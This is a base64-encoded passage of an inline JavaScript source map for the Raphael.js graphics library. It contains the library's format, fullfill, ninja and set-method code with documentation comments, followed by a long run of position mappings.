AgICAgZmlsbDogXCIjZmMwXCJcbiAgICAgfCAgICAgfVxuICAgICB8IF0pO1xuICAgIFxcKi9cbiAgICBwYXBlcnByb3RvLmFkZCA9IGZ1bmN0aW9uIChqc29uKSB7XG4gICAgICAgIGlmIChSLmlzKGpzb24sIFwiYXJyYXlcIikpIHtcbiAgICAgICAgICAgIHZhciByZXMgPSB0aGlzLnNldCgpLFxuICAgICAgICAgICAgICAgIGkgPSAwLFxuICAgICAgICAgICAgICAgIGlpID0ganNvbi5sZW5ndGgsXG4gICAgICAgICAgICAgICAgajtcbiAgICAgICAgICAgIGZvciAoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgICAgIGogPSBqc29uW2ldIHx8IHt9O1xuICAgICAgICAgICAgICAgIGVsZW1lbnRzW2hhc10oai50eXBlKSAmJiByZXMucHVzaCh0aGlzW2oudHlwZV0oKS5hdHRyKGopKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gcmVzO1xuICAgIH07XG5cbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5mb3JtYXRcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFNpbXBsZSBmb3JtYXQgZnVuY3Rpb24uIFJlcGxhY2VzIGNvbnN0cnVjdGlvbiBvZiB0eXBlIOKAnGB7PG51bWJlcj59YOKAnSB0byB0aGUgY29ycmVzcG9uZGluZyBhcmd1bWVudC5cbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0gdG9rZW4gKHN0cmluZykgc3RyaW5nIHRvIGZvcm1hdFxuICAgICAtIOKApiAoc3RyaW5nKSByZXN0IG9mIGFyZ3VtZW50cyB3aWxsIGJlIHRyZWF0ZWQgYXMgcGFyYW1ldGVycyBmb3IgcmVwbGFjZW1lbnRcbiAgICAgPSAoc3RyaW5nKSBmb3JtYXRlZCBzdHJpbmdcbiAgICAgPiBVc2FnZVxuICAgICB8IHZhciB4ID0gMTAsXG4gICAgIHwgICAgIHkgPSAyMCxcbiAgICAgfCAgICAgd2lkdGggPSA0MCxcbiAgICAgfCAgICAgaGVpZ2h0ID0gNTA7XG4gICAgIHwgLy8gdGhpcyB3aWxsIGRyYXcgYSByZWN0YW5ndWxhciBzaGFwZSBlcXVpdmFsZW50IHRvIFwiTTEwLDIwaDQwdjUwaC00MHpcIlxuICAgICB8IHBhcGVyLnBhdGgoUmFwaGFlbC5mb3JtYXQoXCJNezB9LHsxfWh7Mn12ezN9aHs0fXpcIiwgeCwgeSwgd2lkdGgsIGhlaWdodCwgLXdpZHRoKSk7XG4gICAgXFwqL1xuICAgIFIuZm9ybWF0ID0gZnVuY3Rpb24gKHRva2VuLCBwYXJhbXMpIHtcbiAgICAgICAgdmFyIGFyZ3MgPSBSLmlzKHBhcmFtcywgYXJyYXkpID8gWzBdW2NvbmNhdF0ocGFyYW1zKSA6IGFyZ3VtZW50cztcbiAgICAgICAgdG9rZW4gJiYgUi5pcyh0b2tlbiwgc3RyaW5nKSAmJiBhcmdzLmxlbmd0aCAtIDEgJiYgKHRva2VuID0gdG9rZW4ucmVwbGFjZShmb3JtYXRyZywgZnVuY3Rpb24gKHN0ciwgaSkge1xuICAgICAgICAgICAgcmV0dXJuIGFyZ3NbKytpXSA9PSBudWxsID8gRSA6IGFyZ3NbaV07XG4gICAgICAgIH0pKTtcbiAgICAgICAgcmV0dXJuIHRva2VuIHx8IEU7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5mdWxsZmlsbFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogQSBsaXR0bGUgYml0IG1vcmUgYWR2YW5jZWQgZm9ybWF0IGZ1bmN0aW9uIHRoYW4gQFJhcGhhZWwuZm9ybWF0LiBSZXBsYWNlcyBjb25zdHJ1Y3Rpb24gb2YgdHlwZSDigJxgezxuYW1lPn1g4oCdIHRvIHRoZSBjb3JyZXNwb25kaW5nIGFyZ3VtZW50LlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSB0b2tlbiAoc3RyaW5nKSBzdHJpbmcgdG8gZm9ybWF0XG4gICAgIC0ganNvbiAob2JqZWN0KSBvYmplY3Qgd2hpY2ggcHJvcGVydGllcyB3aWxsIGJlIHVzZWQgYXMgYSByZXBsYWNlbWVudFxuICAgICA9IChzdHJpbmcpIGZvcm1hdGVkIHN0cmluZ1xuICAgICA+IFVzYWdlXG4gICAgIHwgLy8gdGhpcyB3aWxsIGRyYXcgYSByZWN0YW5ndWxhciBzaGFwZSBlcXVpdmFsZW50IHRvIFwiTTEwLDIwaDQwdjUwaC00MHpcIlxuICAgICB8IHBhcGVyLnBhdGgoUmFwaGFlbC5mdWxsZmlsbChcIk17eH0se3l9aHtkaW0ud2lkdGh9dntkaW0uaGVpZ2h0fWh7ZGltWyduZWdhdGl2ZSB3aWR0aCddfXpcIiwge1xuICAgICB8ICAgICB4OiAxMCxcbiAgICAgfCAgICAgeTogMjAsXG4gICAgIHwgICAgIGRpbToge1xuICAgICB8ICAgICAgICAgd2lkdGg6IDQwLFxuICAgICB8ICAgICAgICAgaGVpZ2h0OiA1MCxcbiAgICAgfCAgICAgICAgIFwibmVnYXRpdmUgd2lkdGhcIjogLTQwXG4gICAgIHwgICAgIH1cbiAgICAgfCB9KSk7XG4gICAgXFwqL1xuICAgIFIuZnVsbGZpbGwgPSAoZnVuY3Rpb24gKCkge1xuICAgICAgICB2YXIgdG9rZW5SZWdleCA9IC9cXHsoW15cXH1dKylcXH0vZyxcbiAgICAgICAgICAgIG9iak5vdGF0aW9uUmVnZXggPSAvKD86KD86XnxcXC4pKC4rPykoPz1cXFt8XFwufCR8XFwoKXxcXFsoJ3xcIikoLis/KVxcMlxcXSkoXFwoXFwpKT8vZywgLy8gbWF0Y2hlcyAueHh4eHggb3IgW1wieHh4eHhcIl0gdG8gcnVuIG92ZXIgb2JqZWN0IHByb3BlcnRpZXNcbiAgICAgICAgICAgIHJlcGxhY2VyID0gZnVuY3Rpb24gKGFsbCwga2V5LCBvYmopIHtcbiAgICAgICAgICAgICAgICB2YXIgcmVzID0gb2JqO1xuICAgICAgICAgICAgICAgIGtleS5yZXBsYWNlKG9iak5vdGF0aW9uUmVnZXgsIGZ1bmN0aW9uIChhbGwsIG5hbWUsIHF1b3RlLCBxdW90ZWROYW1lLCBpc0Z1bmMpIHtcbiAgICAgICAgICAgICAgICAgICAgbmFtZSA9IG5hbWUgfHwgcXVvdGVkTmFtZTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHJlcykge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG5hbWUgaW4gcmVzKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzID0gcmVzW25hbWVdO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgdHlwZW9mIHJlcyA9PSBcImZ1bmN0aW9uXCIgJiYgaXNGdW5jICYmIChyZXMgPSByZXMoKSk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICByZXMgPSAocmVzID09IG51bGwgfHwgcmVzID09IG9iaiA/IGFsbCA6IHJlcykgKyBcIlwiO1xuICAgICAgICAgICAgICAgIHJldHVybiByZXM7XG4gICAgICAgICAgICB9O1xuICAgICAgICByZXR1cm4gZnVuY3Rpb24gKHN0ciwgb2JqKSB7XG4gICAgICAgICAgICByZXR1cm4gU3RyaW5nKHN0cikucmVwbGFjZSh0b2tlblJlZ2V4LCBmdW5jdGlvbiAoYWxsLCBrZXkpIHtcbiAgICAgICAgICAgICAgICByZXR1cm4gcmVwbGFjZXIoYWxsLCBrZXksIG9iaik7XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgfTtcbiAgICB9KSgpO1xuICAgIC8qXFxcbiAgICAgKiBSYXBoYWVsLm5pbmphXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBJZiB5b3Ugd2FudCB0byBsZWF2ZSBubyB0cmFjZSBvZiBSYXBoYcOrbCAoV2VsbCwgUmFwaGHDq2wgY3JlYXRlcyBvbmx5IG9uZSBnbG9iYWwgdmFyaWFibGUgYFJhcGhhZWxgLCBidXQgYW55d2F5LikgWW91IGNhbiB1c2UgYG5pbmphYCBtZXRob2QuXG4gICAgICogQmV3YXJlLCB0aGF0IGluIHRoaXMgY2FzZSBwbHVnaW5zIGNvdWxkIHN0b3Agd29ya2luZywgYmVjYXVzZSB0aGV5IGFyZSBkZXBlbmRpbmcgb24gZ2xvYmFsIHZhcmlhYmxlIGV4aXN0ZW5jZS5cbiAgICAgKipcbiAgICAgPSAob2JqZWN0KSBSYXBoYWVsIG9iamVjdFxuICAgICA+IFVzYWdlXG4gICAgIHwgKGZ1bmN0aW9uIChsb2NhbF9yYXBoYWVsKSB7XG4gICAgIHwgICAgIHZhciBwYXBlciA9IGxvY2FsX3JhcGhhZWwoMTAsIDEwLCAzMjAsIDIwMCk7XG4gICAgIHwgICAgIOKAplxuICAgICB8IH0pKFJhcGhhZWwubmluamEoKSk7XG4gICAgXFwqL1xuICAgIFIubmluamEgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIGlmIChvbGRSYXBoYWVsLndhcykge1xuICAgICAgICAgICAgZy53aW4uUmFwaGFlbCA9IG9sZFJhcGhhZWwuaXM7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAvLyBJRTggcmFpc2VzIGFuIGVycm9yIHdoZW4gZGVsZXRpbmcgd2luZG93IHByb3BlcnR5XG4gICAgICAgICAgICB3aW5kb3cuUmFwaGFlbCA9IHVuZGVmaW5lZDtcbiAgICAgICAgICAgIHRyeSB7XG4gICAgICAgICAgICAgICAgZGVsZXRlIHdpbmRvdy5SYXBoYWVsO1xuICAgICAgICAgICAgfSBjYXRjaChlKSB7fVxuICAgICAgICB9XG4gICAgICAgIHJldHVybiBSO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwuc3RcbiAgICAgWyBwcm9wZXJ0eSAob2JqZWN0KSBdXG4gICAgICoqXG4gICAgICogWW91IGNhbiBhZGQgeW91ciBvd24gbWV0aG9kIHRvIGVsZW1lbnRzIGFuZCBzZXRzLiBJdCBpcyB3aXNlIHRvIGFkZCBhIHNldCBtZXRob2QgZm9yIGVhY2ggZWxlbWVudCBtZXRob2RcbiAgICAgKiB5b3UgYWRkZWQsIHNvIHlvdSB3aWxsIGJlIGFibGUgdG8gY2FsbCB0aGUgc2FtZSBtZXRob2Qgb24gc2V0cyB0b28uXG4gICAgICoqXG4gICAgICogU2VlIGFsc28gQFJhcGhhZWwuZWwuXG4gICAgID4gVXNhZ2VcbiAgICAgfCBSYXBoYWVsLmVsLnJlZCA9IGZ1bmN0aW9uICgpIHtcbiAgICAgfCAgICAgdGhpcy5hdHRyKHtmaWxsOiBcIiNmMDBcIn0pO1xuICAgICB8IH07XG4gICAgIHwgUmFwaGFlbC5zdC5yZWQgPSBmdW5jdGlvbiAoKSB7XG4gICAgIHwgICAgIHRoaXMuZm9yRWFjaChmdW5jdGlvbiAoZWwpIHtcbiAgICAgfCAgICAgICAgIGVsLnJlZCgpO1xuICAgICB8ICAgICB9KTtcbiAgICAgfCB9O1xuICAgICB8IC8vIHRoZW4gdXNlIGl0XG4gICAgIHwgcGFwZXIuc2V0KHBhcGVyLmNpcmNsZSgxMDAsIDEwMCwgMjApLCBwYXBlci5jaXJjbGUoMTEwLCAxMDAsIDIwKSkucmVkKCk7XG4gICAgXFwqL1xuICAgIFIuc3QgPSBzZXRwcm90bztcblxuICAgIGV2ZS5vbihcInJhcGhhZWwuRE9NbG9hZFwiLCBmdW5jdGlvbiAoKSB7XG4gICAgICAgIGxvYWRlZCA9IHRydWU7XG4gICAgfSk7XG5cbiAgICAvLyBGaXJlZm94IDwzLjYgZml4OiBodHRwOi8vd2VicmVmbGVjdGlvbi5ibG9nc3BvdC5jb20vMjAwOS8xMS8xOTUtY2hhcnMtdG8taGVscC1sYXp5LWxvYWRpbmcuaHRtbFxuICAgIChmdW5jdGlvbiAoZG9jLCBsb2FkZWQsIGYpIHtcbiAgICAgICAgaWYgKGRvYy5yZWFkeVN0YXRlID09IG51bGwgJiYgZG9jLmFkZEV2ZW50TGlzdGVuZXIpe1xuICAgICAgICAgICAgZG9jLmFkZEV2ZW50TGlzdGVuZXIobG9hZGVkLCBmID0gZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgIGRvYy5yZW1vdmVFdmVudExpc3RlbmVyKGxvYWRlZCwgZiwgZmFsc2UpO1xuICAgICAgICAgICAgICAgIGRvYy5yZWFkeVN0YXRlID0gXCJjb21wbGV0ZVwiO1xuICAgICAgICAgICAgfSwgZmFsc2UpO1xuICAgICAgICAgICAgZG9jLnJlYWR5U3RhdGUgPSBcImxvYWRpbmdcIjtcbiAgICAgICAgfVxuICAgICAgICBmdW5jdGlvbiBpc0xvYWRlZCgpIHtcbiAgICAgICAgICAgICgvaW4vKS50ZXN0KGRvYy5yZWFkeVN0YXRlKSA/IHNldFRpbWVvdXQoaXNMb2FkZWQsIDkpIDogUi5ldmUoXCJyYXBoYWVsLkRPTWxvYWRcIik7XG4gICAgICAgIH1cbiAgICAgICAgaXNMb2FkZWQoKTtcbiAgICB9KShkb2N1bWVudCwgXCJET01Db250ZW50TG9hZGVkXCIpO1xuXG4gICAgcmV0dXJuIFI7XG59KTtcbiJdLCJtYXBwaW5ncyI6IkFBQUE7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQU